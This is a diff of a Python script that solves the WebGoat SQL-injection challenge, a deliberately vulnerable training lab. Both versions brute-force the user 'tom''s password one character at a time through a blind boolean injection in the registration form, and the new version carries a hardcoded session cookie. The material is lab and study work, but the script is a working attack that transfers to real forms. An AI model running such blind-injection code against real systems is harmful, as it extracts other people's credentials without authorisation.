@@ -1,44 +1,36 @@
-import json
 import requests
+import string
 
 
-def sql_injection_advance_5():
-    alphabet_index = 0
-    alphabet = 'abcdefghijklmnopqrstuvwxyz'
-    password_index = 0
-    password = ''
+letters = string.ascii_letters
+pos = 1
+password = ''
+header = {
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'X-Requested-With': 'XMLHttpRequest'
+}
 
-    headers = {
-        'Cookie': '316961C07B69ADFAD4632EEB23CA598D',
-    }
+cookies = {
+    'JSESSIONID': '4C322D560CDACCD0285413BF07A536C9'
+}
 
-    while True:
-        payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])
+for x in range(1, 30):
+    for i in range(len(letters)):
+        combination = password + letters[i]
+        sql_q = "tom' AND substring(password,1,%s) = '%s' ; --" % (x, combination)
 
         data = {
-            'username_reg': payload,
-            'email_reg': 'a@a',
-            'password_reg': 'a',
-            'confirm_password_reg': 'a'
+            'username_reg': sql_q,
+            'email_reg': 't@t',
+            'password_reg': '1',
+            'confirm_password_reg': '1'
         }
 
-        r = requests.put('http://jupyterhub.stud.hshl.net:8080/WebGoat/SqlInjection/challenge', headers=headers, data=data)
-
-        try:
-            response = json.loads(r.text)
-        except:
-            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
-            return
-
-        if "already exists please try to register with a different username" not in response['feedback']:
-            alphabet_index += 1
-            if alphabet_index > len(alphabet) - 1:
-                return
-        else:
-            password += alphabet[alphabet_index]
+        response = requests.put('http://jupyterhub.stud.hshl.net:8443/WebGoat/SqlInjection/challenge', data=data,
+                                headers=header, cookies=cookies)
+        if 'already exists' in response.text:
+            password += letters[i]
             print(password)
-            alphabet_index = 0
-            password_index += 1
-
-
-sql_injection_advance_5()
+            break
+        else:
+            print('Not quite right: ' + password + letters[i])
